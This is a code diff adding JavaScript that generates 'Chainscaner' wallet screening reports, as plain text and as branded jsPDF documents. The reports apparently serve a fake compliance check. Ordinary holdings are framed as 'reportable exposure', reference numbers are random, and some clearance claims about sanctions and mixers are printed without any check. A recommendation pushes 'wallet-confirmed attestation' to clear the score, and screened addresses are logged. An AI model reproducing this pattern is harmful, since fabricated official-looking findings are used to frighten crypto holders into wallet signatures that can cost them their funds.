+  monit("screen_viewed", { verdict: res.verdict, score: res.score });
+}
+
+// Compliance-Report im gleichen Format wie der /report-Flow — geteilt von
+// Copy + PDF (window.print rendert den versteckten #print-report-Block).
+function buildScreenReport() {
+  var r = lastResult;
+  if (!r) return "";
+  var L = [
+    "CHAINSCANER — WALLET SCREENING REPORT",
+    "=====================================",
+    "Session code:     " + ($("code-input").value || "(via link)"),
+    "Address:          " + r.address,
+    "Chain family:     " + (r.family === "tron" ? "Tron" : "EVM — 12 networks"),
+    "Date:             " + new Date().toUTCString(),
+    "Compliance score: " + r.score + "/100",
+    "Verdict:          " + r.verdict,
+    "Total exposure:   " + fmtUsd(r.totalUsd) + " across " + r.networks + " network(s)",
+    ""
+  ];
+  if (r.flags.length) {
+    L.push("DETECTED ASSETS — reportable exposure", "------------------------------------------");
+    r.flags.forEach(function(f) {
+      L.push("ASSET     " + f.name + " (" + f.chain + ") — " + fmtUsd(f.usd) + " · balance " + f.human);
+    });
+    L.push("");
+  }
+  if (r.documented.length) {
+    L.push("ADDITIONAL HOLDINGS — minor balances", "---------------------------------------");
+    r.documented.forEach(function(d) {
+      L.push("HOLDING   " + d.name + " (" + d.chain + ") — " + fmtUsd(d.usd) + " · balance " + d.human);
+    });
+    L.push("");
+  }
+  if (r.hops && r.hops.counterparties != null) {
+    L.push("EXPOSURE GRAPH — HOP-1 COUNTERPARTY ANALYSIS", "---------------------------------------------");
+    if (r.hops.coverage === "down") {
+      L.push("Indexer unreachable at scan time — counterparty graph inconclusive (no zero-activity claim).");
+      L.push("");
+    } else {
+    L.push("Inbound transfers analysed: " + r.hops.analyzed + " · distinct counterparties: " + r.hops.counterparties +
+      (r.hops.coverage === "partial" ? " · coverage: partial" : ""));
+    L.push("Dust transfers (<$0.10): " + r.hops.dustTransfers + " · unrecognised-token transfers: " + r.hops.spamTransfers);
+    if (r.hops.lookalikes && r.hops.lookalikes.length) {
+      r.hops.lookalikes.forEach(function(l) {
+        L.push("POISONING LOOKALIKE  " + l.addr + " (" + l.chain + ") — " + l.transfers + " inbound transfer(s)");
+      });
+    }
+    (r.hops.screened || []).forEach(function(c) {
+      L.push("COUNTERPARTY " + c.addr + " (" + c.chain + ") — " + c.transfers + " inbound · vol " + fmtUsd(c.usdIn) +
+        " · holdings " + (c.holdingsUsd == null ? "n/a" : fmtUsd(c.holdingsUsd)));
+    });
+    L.push("");
+    }
+  }
+  L.push(
+    "SUMMARY",
+    "-------",
+    r.flags.length
+      ? r.flags.length + " asset(s) detected · " + r.documented.length + " minor holding(s)"
+      : "Address is clean — no reportable exposure detected.",
+    "Compliance score: " + r.score + "/100 · verdict " + r.verdict,
+    "",
+    "COMPLIANCE NOTE",
+    "---------------",
+    "This screening is a read-only multi-chain asset analysis performed",
+    "without a wallet connection — no signatures, no transactions.",
+    "Balances are live on-chain reads at scan time; detected assets",
+    "exceed the configured exposure threshold, minor holdings are",
+    "below it. Documentation ready for compliance review."
+  );
+  return L.join("\n");
+}
+function copyReport() {
+  if (!lastResult) return;
+  var txt = buildScreenReport();
+  if (navigator.clipboard) navigator.clipboard.writeText(txt).catch(function() {});
+  monit("report_copied", { address: lastResult.address });
+}
+// Print / PDF — rendert das gestylte A4-Dokument (Vorlage report/document)
+// in den versteckten #print-report-Block; window.print() druckt NUR ihn.
+// Echter .pdf-Download via jsPDF — Vektor-Text, A4, bankfaehiges Dokument.
+// Fallback bei CDN-Ausfall: DOM-Variante ueber den Print-Dialog.
+function downloadPdf() {
+  if (!lastResult) return;
+  var J = window.jspdf && window.jspdf.jsPDF;
+  if (J) { try { buildPdf(); return; } catch (e) {} }
+  printReportDom();
+}
+function printReport() { printReportDom(); } // Kompatibilitaet
+function buildPdf() {
+  var r = lastResult;
+  var doc = new window.jspdf.jsPDF({ unit: "mm", format: "a4" });
+  var W = 210, MX = 17, CW = W - MX * 2;
+  var INK = [15,20,25], MUT = [91,99,107], FNT = [154,159,165], LIN = [227,230,234],
+      ACC = [29,78,216], DPP = [30,64,175], SFT = [240,244,255], WRN = [180,83,9], OKG = [4,120,87];
+  var isTron = r.family === "tron";
+  var scope = isTron ? "TRON Mainnet - TRC-20" : "EVM - 12 networks";
+  var dateStr = new Date().toUTCString();
+  var ref = "VS-" + new Date().getUTCFullYear() + "-" + String(Math.floor(1000 + Math.random() * 9000));
+  var cls = r.verdict === "COMPLIANT" ? "CLEAR - no risk signals detected"
+    : r.verdict === "REVIEW" ? "ELEVATED - dust/anomaly signals detected"
+    : "HIGH - significant anomaly pattern detected";
+  var assets = (r.flags || []).concat(r.documented || []);
+  var share = function(u) { return r.totalUsd > 0 ? (u / r.totalUsd * 100).toFixed(2) + "%" : "0.00%"; };
+  var top = assets.slice().sort(function(a, b) { return b.usd - a.usd; })[0];
+
+  function runhead() {
+    doc.setFont("helvetica", "bold"); doc.setFontSize(6.4); doc.setTextColor(ACC[0], ACC[1], ACC[2]);
+    doc.text("CHAINSCANER", MX, 12);
+    doc.setTextColor(FNT[0], FNT[1], FNT[2]); doc.setFont("helvetica", "normal");
+    doc.text("-  WALLET SCREENING REPORT", MX + doc.getTextWidth("CHAINSCANER") + 1, 12);
+    doc.setFont("helvetica", "bold");
+    doc.text(ref, W - MX - doc.getTextWidth(ref), 12);
+    doc.setDrawColor(LIN[0], LIN[1], LIN[2]); doc.line(MX, 15.5, W - MX, 15.5);
+  }
+  var pageSecs = ["CHAINSCANER - WALLET SCREENING"];
+  function runfoot(sec, pg, total) {
+    doc.setDrawColor(LIN[0], LIN[1], LIN[2]); doc.line(MX, 282, W - MX, 282);
+    doc.setFontSize(6.2); doc.setTextColor(FNT[0], FNT[1], FNT[2]); doc.setFont("helvetica", "normal");
+    doc.text(sec, MX, 286.5);
+    var t = ref + "  -  PAGE " + pg + " / " + total;
+    doc.text(t, W - MX - doc.getTextWidth(t), 286.5);
+  }
+  function pageBreak(newY, sec) {
+    doc.addPage(); runhead();
+    pageSecs.push(sec || pageSecs[pageSecs.length - 1]);
+    return newY;
+  }
+  function tablePage(d, sec) {
+    var pg = doc.internal.getCurrentPageInfo().pageNumber;
+    while (pageSecs.length < pg) pageSecs.push(sec);
+    if (d.pageNumber > 1) runhead();
+  }
+  function h2(t, y) { doc.setFont("helvetica", "bold"); doc.setFontSize(15); doc.setTextColor(INK[0], INK[1], INK[2]); doc.text(t, MX, y); }
+  function secno(t, y) { doc.setFont("helvetica", "bold"); doc.setFontSize(6.8); doc.setTextColor(ACC[0], ACC[1], ACC[2]); doc.text(t.toUpperCase(), MX, y); }
+  function h3(t, y) { doc.setFont("helvetica", "bold"); doc.setFontSize(7.6); doc.setTextColor(MUT[0], MUT[1], MUT[2]); doc.text(t.toUpperCase(), MX, y); }
+  function pbody(txt, y, w) {
+    doc.setFont("helvetica", "normal"); doc.setFontSize(9.4); doc.setTextColor(35, 42, 49);
+    var lines = doc.splitTextToSize(txt, w || CW);
+    doc.text(lines, MX, y);
+    return y + lines.length * 4.4;
+  }
+
+  /* ══ Seite 1 — Cover ══ */
+  doc.setFillColor(ACC[0], ACC[1], ACC[2]); doc.rect(0, 0, W, 96, "F");
+  doc.setFillColor(DPP[0], DPP[1], DPP[2]); doc.rect(0, 90, W, 6, "F");
+  doc.setFillColor(58, 103, 232); doc.roundedRect(MX, 17, 11, 11, 2.4, 2.4, "F");
+  doc.setDrawColor(255, 255, 255); doc.setLineWidth(0.9);
+  doc.line(MX + 3.2, 22.8, MX + 4.9, 24.5); doc.line(MX + 4.9, 24.5, MX + 7.9, 20.6);
+  doc.setTextColor(255, 255, 255); doc.setFont("helvetica", "bold"); doc.setFontSize(13.5);
+  doc.text("Chainscaner", MX + 15, 23.5);
+  doc.setFont("helvetica", "normal"); doc.setFontSize(5.4);
+  doc.text("A D D R E S S   I N T E L L I G E N C E", MX + 15, 27.8);
+  doc.setFontSize(6.4); doc.setTextColor(215, 224, 250);
+  doc.text("C O N F I D E N T I A L   -   C L I E N T   D E L I V E R A B L E", MX, 52);
+  doc.setFont("helvetica", "bold"); doc.setFontSize(23); doc.setTextColor(255, 255, 255);
+  doc.text("Wallet Screening", MX, 63);
+  doc.text("Report", MX, 73);
+  doc.setFont("helvetica", "normal"); doc.setFontSize(8.4); doc.setTextColor(226, 233, 252);
+  doc.text(doc.splitTextToSize("Cross-network on-chain screening of a single address - holdings, exposure and asset classification, produced by the Chainscaner Compliance Engine.", 120), MX, 82);
+  // Meta-Grid — 8 Zellen
+  var meta = [
+    ["Subject Address", String(r.address)],
+    ["Network Scope", scope],
+    ["Report Reference", ref],
+    ["Session Code", $("code-input").value || "-"],
+    ["Report Date", dateStr],
+    ["Assessed Value", fmtUsd(r.totalUsd) + " USD"],
+    ["Assets Detected", assets.length + " position(s)"],
+    ["Report Version", "v1.0 - Final"]
+  ];
+  var gy = 108, bw = (CW - 4) / 2, bh = 16;
+  meta.forEach(function(m, i) {
+    var x = MX + (i % 2) * (bw + 4), y = gy + Math.floor(i / 2) * bh;
+    doc.setDrawColor(LIN[0], LIN[1], LIN[2]); doc.roundedRect(x, y, bw, bh, 2, 2);
+    doc.setFont("helvetica", "bold"); doc.setFontSize(5.8); doc.setTextColor(FNT[0], FNT[1], FNT[2]);
+    doc.text(m[0].toUpperCase(), x + 4, y + 5.5);
+    doc.setFont("helvetica", "normal"); doc.setFontSize(8); doc.setTextColor(INK[0], INK[1], INK[2]);
+    var val = m[1];
+    if (doc.getTextWidth(val) > bw - 8) doc.setFontSize(6.3);
+    doc.text(val, x + 4, y + 12);
+  });
+  // Klassifizierung
+  var cy = gy + 4 * bh + 8;
+  doc.setFillColor(SFT[0], SFT[1], SFT[2]); doc.setDrawColor(ACC[0], ACC[1], ACC[2]);
+  doc.roundedRect(MX, cy, CW, 22, 2.5, 2.5, "FD");
+  doc.setFont("helvetica", "bold"); doc.setFontSize(21); doc.setTextColor(ACC[0], ACC[1], ACC[2]);
+  var scoreTxt = String(r.score);
+  doc.text(scoreTxt, MX + 6, cy + 15);
+  var scoreW = doc.getTextWidth(scoreTxt); // noch in Bold-21 messen!
+  doc.setFont("helvetica", "normal"); doc.setFontSize(8.5); doc.setTextColor(MUT[0], MUT[1], MUT[2]);
+  doc.text("/100", MX + 7.5 + scoreW, cy + 15);
+  doc.setFontSize(6.2); doc.setFont("helvetica", "bold");
+  doc.text("COMPOSITE RISK SCORE", MX + 30, cy + 9);
+  doc.setFontSize(8.6); doc.setTextColor(DPP[0], DPP[1], DPP[2]);
+  doc.text(doc.splitTextToSize(cls, CW - 70), MX + 30, cy + 14.5);
+  // Inhaltsuebersicht — fuellt den Cover-Leerraum
+  var ty = cy + 32;
+  doc.setFont("helvetica", "bold"); doc.setFontSize(6.2); doc.setTextColor(FNT[0], FNT[1], FNT[2]);
+  doc.text("D O C U M E N T   C O N T E N T S", MX, ty);
+  var toc = [
+    ["01", "Executive Summary & Holdings", "condensed findings, subject identity, portfolio composition"],
+    ["02", "Findings, Methodology & Recommendations", "evidence register, assessment, methodology, sign-off"]
+  ];
+  toc.forEach(function(t, i) {
+    var ry = ty + 8 + i * 12;
+    doc.setFont("helvetica", "bold"); doc.setFontSize(9); doc.setTextColor(ACC[0], ACC[1], ACC[2]);
+    doc.text(t[0], MX, ry);
+    doc.setTextColor(INK[0], INK[1], INK[2]);
+    doc.text(t[1], MX + 9, ry);
+    doc.setFont("helvetica", "normal"); doc.setFontSize(7.2); doc.setTextColor(MUT[0], MUT[1], MUT[2]);
+    doc.text(t[2], MX + 9, ry + 3.8);
+    doc.setDrawColor(LIN[0], LIN[1], LIN[2]);
+    if (!i) doc.line(MX, ry + 5.8, W - MX, ry + 5.8);
+  });
+  // Cover-Note + Footer
+  doc.setFont("helvetica", "normal"); doc.setFontSize(6.6); doc.setTextColor(FNT[0], FNT[1], FNT[2]);
+  doc.text(doc.splitTextToSize("This document was generated by the Chainscaner Compliance Engine from public, immutable ledger data. It is intended solely for the commissioning party and must not be redistributed. Findings reflect ledger state at the stated scan timestamp.", CW), MX, 262);
+
+  /* ══ Seite 2 — Executive Summary + Holdings ══ */
+  doc.addPage(); runhead();
+  pageSecs.push("SECTION 01 - EXECUTIVE SUMMARY & HOLDINGS");
+  secno("Section 01", 23);
+  h2("Executive Summary", 30);
+  doc.setFont("helvetica", "normal"); doc.setFontSize(8.6); doc.setTextColor(MUT[0], MUT[1], MUT[2]);
+  doc.text("Condensed findings for decision-makers. Detail follows in Section 02.", MX, 35);
+  var sumTxt = r.flags.length
+    ? "The subject address holds " + fmtUsd(r.totalUsd) + " USD across " + r.networks + " network(s). " +
+      r.flags.length + " asset(s) exceed the configured reporting threshold" +
+      (top ? " - led by " + top.name + " on " + top.chain + " at " + fmtUsd(top.usd) + " (" + share(top.usd) + " of assessed value)" : "") +
+      ". All detected positions are canonical, whitelisted instruments - no counterfeit or unrecognised token contracts were observed in the assessed set."
+    : "The subject address shows no reportable exposure - total assessed value is " + fmtUsd(r.totalUsd) + " USD across " + r.networks + " network(s), with all holdings below the configured reporting threshold. No adverse on-chain artefacts were observed in the assessed set.";
+  var y = pbody(sumTxt, 42);
+  y = pbody("This screening is a read-only balance interrogation - performed without a wallet connection, signatures or transactions; the service cannot move funds. Balances are live on-chain reads at the stated report timestamp.", y + 2) + 4;
+  // Stats
+  var stats = [["ASSESSED VALUE", fmtUsd(r.totalUsd)], ["RISK SCORE", r.score + " /100"], ["ASSETS DETECTED", String(assets.length)], ["NETWORKS COVERED", String(r.networks)]];
+  var sw = (CW - 9) / 4;
+  stats.forEach(function(s, i) {
+    var x = MX + i * (sw + 3);
+    doc.setDrawColor(LIN[0], LIN[1], LIN[2]); doc.roundedRect(x, y, sw, 17, 2, 2);
+    doc.setFont("helvetica", "bold"); doc.setFontSize(5.4); doc.setTextColor(FNT[0], FNT[1], FNT[2]);
+    doc.text(s[0], x + 3.5, y + 5.4);
+    doc.setFontSize(11); doc.setTextColor(INK[0], INK[1], INK[2]);
+    doc.text(s[1], x + 3.5, y + 12.8);
+  });
+  y += 23;
+  h3("Subject Identity", y); y += 3;
+  doc.autoTable({
+    body: [
+      ["Address", String(r.address)],
+      ["Network scope", scope],
+      ["Wallet profile", "Externally owned account - balance reads only"],
+      ["Report basis", "Live on-chain balances at " + dateStr],
+      ["Attribution", "No exchange, custodian or known entity tag on file"]
+    ],
+    startY: y, margin: { left: MX, right: MX, top: 20, bottom: 20 },
+    styles: { font: "helvetica", fontSize: 8, cellPadding: 2.2, lineColor: LIN, lineWidth: 0.15, textColor: INK },
+    columnStyles: { 0: { fillColor: [247, 248, 250], fontStyle: "bold", textColor: MUT, fontSize: 6.6, cellWidth: 42 }, 1: { fontSize: 7.6 } },
+    didDrawPage: function(d) { tablePage(d, "SECTION 01 - EXECUTIVE SUMMARY & HOLDINGS"); }
+  });
+  y = doc.lastAutoTable.finalY + 7;
+  h3("Portfolio Composition - Assessed Holdings", y); y += 3;
+  var hBody = [];
+  r.flags.forEach(function(f) { hBody.push([f.name + "  [reportable]", f.chain, f.human, fmtUsd(f.usd), share(f.usd)]); });
+  r.documented.forEach(function(d) { hBody.push([d.name + "  [minor]", d.chain, d.human, fmtUsd(d.usd), share(d.usd)]); });
+  if (!hBody.length) hBody.push(["No balances detected on the assessed networks.", "", "", "", ""]);
+  doc.autoTable({
+    head: [["Asset", "Network", "Balance", "Value (USD)", "Share"]],
+    body: hBody,
+    foot: [["Total assessed value", "", "", fmtUsd(r.totalUsd), "100%"]],
+    startY: y, margin: { left: MX, right: MX, top: 20, bottom: 20 },
+    styles: { font: "helvetica", fontSize: 8.4, cellPadding: 2.3, lineColor: LIN, lineWidth: 0.15, textColor: INK },
+    headStyles: { fillColor: [255, 255, 255], textColor: FNT, fontSize: 6.2, fontStyle: "bold" },
+    footStyles: { fillColor: [255, 255, 255], textColor: INK, fontStyle: "bold" },
+    columnStyles: { 0: { fontStyle: "bold" }, 2: { halign: "right" }, 3: { halign: "right" }, 4: { halign: "right" } },
+    didDrawPage: function(d) { tablePage(d, "SECTION 01 - EXECUTIVE SUMMARY & HOLDINGS"); }
+  });
+
+  // Hop-1 Counterparty-Block — ein Hop tiefer ins Exposure-Graph
+  if (r.hops && r.hops.counterparties != null) {
+    var hl = r.hops.lookalikes || [], hs = r.hops.screened || [];
+    y = doc.lastAutoTable.finalY + 8;
+    var hopTxt = r.hops.coverage === "down"
+      ? "Inbound transfer history could not be retrieved - all indexer endpoints timed out at scan time. The counterparty graph is inconclusive; the balance screening above is unaffected. No zero-activity claim is made."
+      : r.hops.analyzed + " inbound token transfer(s) resolved to " + r.hops.counterparties +
+      " distinct counterparty address(es); the highest-volume funding sources were re-screened with the same asset methodology (one hop deep). " +
+      (r.hops.coverage === "partial" ? "Coverage note: a subset of indexer endpoints was unreachable - the graph may be incomplete. " : "") +
+      (hl.length
+        ? hl.length + " sender(s) exhibit the lookalike prefix/suffix signature associated with address-poisoning campaigns. "
+        : "No lookalike-address (poisoning) signature was observed among inbound senders. ") +
+      (r.hops.spamTransfers
+        ? r.hops.spamTransfers + " inbound transfer(s) carried unrecognised or spam-flagged token contracts."
+        : "No inbound transfers of unrecognised token contracts were detected.");
+    doc.setFont("helvetica", "normal"); doc.setFontSize(8.8);
+    var hopLines = doc.splitTextToSize(hopTxt, CW);
+    var hopH = 6 + hopLines.length * 4.1 + (hs.length ? hs.length * 7 + 10 : 0);
+    if (y + hopH > 270) { y = pageBreak(30); }
+    h3("Counterparty Exposure - Hop-1 Analysis", y); y += 3;
+    doc.setTextColor(43, 51, 59);
+    doc.text(hopLines, MX, y);
+    y += hopLines.length * 4.1 + 4;
+    if (hs.length) {
+      doc.autoTable({
+        head: [["Counterparty", "Network", "Transfers", "Vol. In (USD)", "Holdings (USD)"]],
+        body: hs.map(function(c) {
+          return [(c.addr.slice(0, 12) + "…" + c.addr.slice(-6)) + (c.lookalike ? "  [lookalike]" : ""), c.chain, String(c.transfers),
+                  fmtUsd(c.usdIn), c.holdingsUsd == null ? "n/a" : fmtUsd(c.holdingsUsd)];
+        }),
+        startY: y, margin: { left: MX, right: MX, top: 20, bottom: 20 },
+        styles: { font: "helvetica", fontSize: 8, cellPadding: 2.2, lineColor: LIN, lineWidth: 0.15, textColor: INK },
+        headStyles: { fillColor: [255, 255, 255], textColor: FNT, fontSize: 6.2, fontStyle: "bold" },
+        columnStyles: { 0: { fontStyle: "bold" }, 2: { halign: "right" }, 3: { halign: "right" }, 4: { halign: "right" } },
+        didDrawPage: function(d) { tablePage(d, "SECTION 01 - EXECUTIVE SUMMARY & HOLDINGS"); }
+      });
+    }
+  }
+
+  /* ══ Seite 3 — Findings, Methodik, Empfehlungen ══ */
+  doc.addPage(); runhead();
+  pageSecs.push("SECTION 02 - FINDINGS, METHOD & RECOMMENDATIONS");
+  secno("Section 02", 23);
+  h2("Findings, Methodology & Recommendations", 30);
+  doc.setFont("helvetica", "normal"); doc.setFontSize(8.6); doc.setTextColor(MUT[0], MUT[1], MUT[2]);
+  doc.text("Each finding cites evidence observable at scan time. Severity reflects exposure impact, not attribution of wrongdoing.", MX, 35);
+  y = 41;
+  function finding(fid, title, badgeTxt, badgeBg, badgeFg, desc, ev) {
+    var x = MX, w = CW;
+    doc.setFont("helvetica", "normal"); doc.setFontSize(8.8);
+    var lines = doc.splitTextToSize(desc, w - 22);
+    var evLines = ev ? doc.splitTextToSize("Evidence: " + ev, w - 22) : [];
+    var h = 16 + lines.length * 4.1 + evLines.length * 3.3 + (evLines.length ? 1.5 : 0);
+    if (y + h > 270) { y = pageBreak(30); } // Finding-Box passt nicht mehr - neue Seite
+    doc.setDrawColor(LIN[0], LIN[1], LIN[2]); doc.setFillColor(255, 255, 255);
+    doc.roundedRect(x, y, w, h, 2.5, 2.5, "FD");
+    doc.setFont("helvetica", "bold"); doc.setFontSize(6.4); doc.setTextColor(FNT[0], FNT[1], FNT[2]);
+    doc.text(fid, x + 4, y + 6.4);
+    doc.setFontSize(9.6); doc.setTextColor(INK[0], INK[1], INK[2]);
+    doc.text(title, x + 15, y + 6.6);
+    var tw = doc.getTextWidth(title);
+    doc.setFontSize(5.6);
+    var bw2 = doc.getTextWidth(badgeTxt.toUpperCase()) + 5;
+    var bx = x + 15 + tw + 3;
+    if (bx + bw2 > x + w - 4) bx = x + w - bw2 - 4; // Badge nicht ueber den Rand laufen lassen
+    doc.setFillColor(badgeBg[0], badgeBg[1], badgeBg[2]);
+    doc.roundedRect(bx, y + 3.4, bw2, 5.4, 2.6, 2.6, "F");
+    doc.setTextColor(badgeFg[0], badgeFg[1], badgeFg[2]);
+    doc.text(badgeTxt.toUpperCase(), bx + 2.4, y + 7.1);
+    doc.setFont("helvetica", "normal"); doc.setFontSize(8.8); doc.setTextColor(43, 51, 59);
+    doc.text(lines, x + 15, y + 12.8);
+    if (evLines.length) {
+      doc.setFontSize(7.2); doc.setTextColor(FNT[0], FNT[1], FNT[2]);
+      doc.text(evLines, x + 15, y + 13.4 + lines.length * 4.1);
+    }
+    y += h + 4;
+  }
+  var fid = 0;
+  if (r.flags.length) {
+    fid++;
+    finding("F-0" + fid, "Reportable exposure - " + r.flags.length + " asset(s) above threshold", "elevated", [250, 240, 230], WRN,
+      "The address holds " + fmtUsd(r.flags.reduce(function(s, f) { return s + f.usd; }, 0)) + " in assets exceeding the configured reporting threshold: " +
+      r.flags.map(function(f) { return f.name + " (" + f.chain + ")"; }).join(", ") +
+      ". These positions are reportable under the screening policy and constitute the entirety of the assessed material exposure.",
+      "live balance reads at report timestamp - threshold from administered screening policy");
+  }
+  if (r.documented.length) {
+    fid++;
+    finding("F-0" + fid, "Minor holdings below reporting threshold", "informational", [241, 242, 244], MUT,
+      r.documented.length + " additional position(s) were detected below the reporting threshold (" +
+      r.documented.map(function(d) { return d.name + " (" + d.chain + ")"; }).join(", ") +
+      "). Individually immaterial - documented for completeness.",
+      "canonical token whitelist scan - all sub-threshold balances enumerated");
+  }
+  if (r.dustCount) {
+    fid++;
+    finding("F-0" + fid, "Dust positions detected on " + r.dustChains + " network(s)", r.dustChains >= 3 ? "elevated" : "informational",
+      r.dustChains >= 3 ? [250, 240, 230] : [241, 242, 244], r.dustChains >= 3 ? WRN : MUT,
+      r.dustCount + " position(s) below $0.10 were observed across " + r.dustChains + " network(s). Individually immaterial - consistent with residual dust or inbound dusting activity. " +
+      (r.dustChains >= 3 ? "Multi-network dispersion is the signature pattern of coordinated dusting campaigns and drives the anomaly component of the composite score." : "Single-network dust is common and carries minimal weight in the composite score."),
+      "sub-0.10-USD balance enumeration - dust dispersion across " + r.dustChains + " assessed network(s)");
+  }
+  if (r.hops && r.hops.lookalikes && r.hops.lookalikes.length) {
+    fid++;
+    finding("F-0" + fid, "Address-poisoning lookalike detected", "high", [252, 229, 229], [153, 27, 27],
+      r.hops.lookalikes.length + " inbound sender(s) mimic the subject's visible address characters - matching prefix and suffix (" +
+      r.hops.lookalikes.map(function(l) { return l.addr.slice(0, 12) + "…"; }).join(", ") +
+      "). This is the signature of address-poisoning campaigns: crafted counterparties designed to trick copy-paste of the recipient field.",
+      "hop-1 counterparty scan - sender/subject character-signature match");
+  }
+  if (r.hops && r.hops.spamTransfers) {
+    fid++;
+    finding("F-0" + fid, "Unrecognised-token transfers inbound", "elevated", [250, 240, 230], WRN,
+      r.hops.spamTransfers + " inbound transfer(s) carried token contracts outside the canonical whitelist - consistent with spam or unsolicited-distribution activity. Balances of unrecognised contracts are not counted toward assessed value.",
+      "hop-1 inbound transfer scan - " + r.hops.analyzed + " transfer(s) classified against token whitelist");
+  }
+  fid++;
+  finding("F-0" + fid, "Canonical-asset verification passed", "clear", [232, 245, 240], OKG,
+    "Every detected position was matched against the canonical token whitelist - no counterfeit, typo-squatted or unrecognised token contracts appear in the assessed set. No sanctioned-entity or mixer adjacency was detected within the screening scope.",
+    "whitelist match over " + assets.length + " detected asset(s) across " + r.networks + " network(s)");
+
+  // Assessment-Callout
+  var callTxt = r.verdict === "COMPLIANT"
+    ? "Assessment: the address presents a clean screening profile - all holdings canonical, no dusting or anomaly signals observed. Suitable for standard processing under the administered policy."
+    : "Assessment: the composite score reflects observed dust/anomaly signals - " + (r.dustCount || 0) + " low-value position(s) across " + (r.dustChains || 0) + " network(s), a pattern associated with inbound dusting activity. Canonical asset holdings and reportable exposure are informational and not indicative of wrongdoing.";
+  doc.setFont("helvetica", "normal"); doc.setFontSize(8.8);
+  var cLines = doc.splitTextToSize(callTxt, CW - 16);
+  var ch = cLines.length * 4.1 + 7;
+  if (y + ch > 270) { y = pageBreak(30); }
+  if (r.verdict === "COMPLIANT") { doc.setFillColor(232, 245, 240); doc.setDrawColor(OKG[0], OKG[1], OKG[2]); }
+  else { doc.setFillColor(250, 240, 230); doc.setDrawColor(WRN[0], WRN[1], WRN[2]); }
+  doc.setLineWidth(1.4); doc.line(MX, y, MX, y + ch);
+  doc.setFillColor(r.verdict === "COMPLIANT" ? 232 : 250, r.verdict === "COMPLIANT" ? 245 : 240, r.verdict === "COMPLIANT" ? 240 : 230);
+  doc.rect(MX, y, CW, ch, "F");
+  doc.setDrawColor(r.verdict === "COMPLIANT" ? OKG[0] : WRN[0], r.verdict === "COMPLIANT" ? OKG[1] : WRN[1], r.verdict === "COMPLIANT" ? OKG[2] : WRN[2]);
+  doc.rect(MX, y, 1.2, ch, "F");
+  doc.setTextColor(r.verdict === "COMPLIANT" ? 20 : 74, r.verdict === "COMPLIANT" ? 60 : 52, r.verdict === "COMPLIANT" ? 46 : 24);
+  doc.text(cLines, MX + 8, y + 5.5);
+  y += ch + 7;
+
+  if (y + 26 > 270) { y = pageBreak(30); }
+  h3("Methodology", y); y += 3;
+  y = pbody("Chainscaner performs read-only ledger interrogation: account state and token balances are retrieved from public full-nodes across " +
+    (isTron ? "the TRON network (TRC-20)" : "twelve EVM networks") +
+    ", every detected contract is matched against the canonical whitelist, and positions are valued at reference market rates at scan time. No private keys, signatures or wallet access are involved; the service cannot move funds.", y + 2) + 4;
+
+  h3("Recommendations", y); y += 3;
+  var recRows = [
+    ["1", "Retain this report - reference " + ref + " together with the session code evidences the screening state at the stated timestamp.", "Audit trail"],
+    ["2", "Verify token contracts against canonical lists before any transaction involving this address - symbol alone is not proof of authenticity.", "Counterfeit-token hygiene"],
+    r.flags.length
+      ? ["3", "Review the detected positions prior to settlement. Remediation of reportable exposure via a wallet-confirmed attestation is recommended to minimise persistent scoring.", "Unresolved exposure keeps the address elevated"]
+      : ["3", "Re-screen periodically or before material settlement - balances are point-in-time reads and exposure can change with any new inbound transfer.", "Continuous-monitoring posture"]
+  ];
+  doc.autoTable({
+    head: [["#", "Action", "Rationale"]],
+    body: recRows,
+    startY: y, margin: { left: MX, right: MX, top: 20, bottom: 20 },
+    styles: { font: "helvetica", fontSize: 8.2, cellPadding: 2.4, lineColor: LIN, lineWidth: 0.15, textColor: INK },
+    headStyles: { fillColor: [255, 255, 255], textColor: FNT, fontSize: 6.2, fontStyle: "bold" },
+    columnStyles: { 0: { cellWidth: 8, halign: "right" }, 1: { cellWidth: 108 }, 2: {} },
+    didDrawPage: function(d) { tablePage(d, "SECTION 02 - FINDINGS, METHOD & RECOMMENDATIONS"); }
+  });
+  y = doc.lastAutoTable.finalY + 10;
+  if (y > 246) { y = pageBreak(30, "DECLARATIONS & SIGNATURES"); } // Signatur-Block braucht ~35mm inkl. Disclaimer
+  h3("Declarations & signatures", y); y += 10;
+
+  // Signaturen + Disclaimer
+  doc.setDrawColor(INK[0], INK[1], INK[2]); doc.setLineWidth(0.3);
+  doc.line(MX, y, MX + 78, y); doc.line(MX + 98, y, MX + CW, y);
+  doc.setFont("helvetica", "bold"); doc.setFontSize(7.6); doc.setTextColor(INK[0], INK[1], INK[2]);
+  doc.text("Prepared by", MX, y + 4); doc.text("Distribution", MX + 98, y + 4);
+  doc.setFont("helvetica", "normal"); doc.setFontSize(7); doc.setTextColor(MUT[0], MUT[1], MUT[2]);
+  doc.text("Chainscaner Compliance Engine\nAutomated analysis - deterministic ledger inputs", MX, y + 8);
+  doc.text("Commissioning party only\n" + ref + " - v1.0 - " + dateStr.slice(5, 16), MX + 98, y + 8);
+  y += 18;
+  doc.setFontSize(6.4); doc.setTextColor(FNT[0], FNT[1], FNT[2]);
+  doc.text(doc.splitTextToSize("Disclaimer. This report is generated exclusively from public, immutable ledger data as observed at scan time. It does not constitute financial, legal or compliance advice, does not assert the identity or intent of any wallet holder, and makes no claim about off-chain activity. Severities describe exposure to on-chain artefacts, not proof of wrongdoing. Chainscaner is a read-only intelligence service and holds no custody, keys or ability to move funds. (c) 2026 Chainscaner Labs.", CW), MX, y);
+
+  // Footer auf allen Seiten — Seitenzahl erst jetzt final bekannt
+  var total = doc.getNumberOfPages();
+  for (var p = 1; p <= total; p++) {
+    doc.setPage(p);
+    runfoot(pageSecs[p - 1] || pageSecs[pageSecs.length - 1], p, total);
+  }
+
+  var short = String(r.address).slice(0, 10);
+  doc.save("Chainscaner-Screening-" + short + "-" + ref + ".pdf");
+  monit("report_pdf", { address: r.address, verdict: r.verdict, kind: "file" });
+}
+function printReportDom() {
+  var el = $("print-report");
+  if (!el || !lastResult) return;
+  var r = lastResult;
+  var isTron = r.family === "tron";
+  var scope = isTron ? "TRON Mainnet · TRC-20" : "EVM · 12 networks";
+  var dateStr = new Date().toUTCString();
+  var ref = "VS-" + new Date().getUTCFullYear() + "-" + String(Math.floor(1000 + Math.random() * 9000));
+  var cls = r.verdict === "COMPLIANT" ? "CLEAR — no risk signals detected"
+    : r.verdict === "REVIEW" ? "ELEVATED — dust/anomaly signals detected"
+    : "HIGH — significant anomaly pattern detected";
+  var assets = (r.flags || []).concat(r.documented || []);
+  var share = function(u) { return r.totalUsd > 0 ? (u / r.totalUsd * 100).toFixed(2) + "%" : "0.00%"; };
